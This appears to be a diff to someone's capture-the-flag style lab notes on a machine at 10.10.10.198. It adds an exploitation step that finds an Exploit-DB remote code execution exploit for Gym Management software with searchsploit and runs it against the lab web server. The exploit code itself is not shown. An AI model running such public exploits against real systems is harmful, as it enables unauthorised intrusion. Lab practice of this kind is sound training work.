@@ -48,4 +48,14 @@ Information leakage `http://10.10.10.198:8080/profile/`, `http://10.10.10.198:80
 >[!example]- Result
 >![[Pasted image 20250304210850.png]]
 
-- looks like this software version have a RCE vulnerability 
+# Exploitation
+- looks like this software version have a RCE vulnerability [link](https://www.exploit-db.com/exploits/48506) (use python2)
+```bash
+searchsploit Gym Management
+python 48506.py http://10.10.10.198:8080/
+```
+>[!example]- Result
+>![[Pasted image 20250304222313.png]]
+>![[Pasted image 20250304222540.png]]
+
+# 
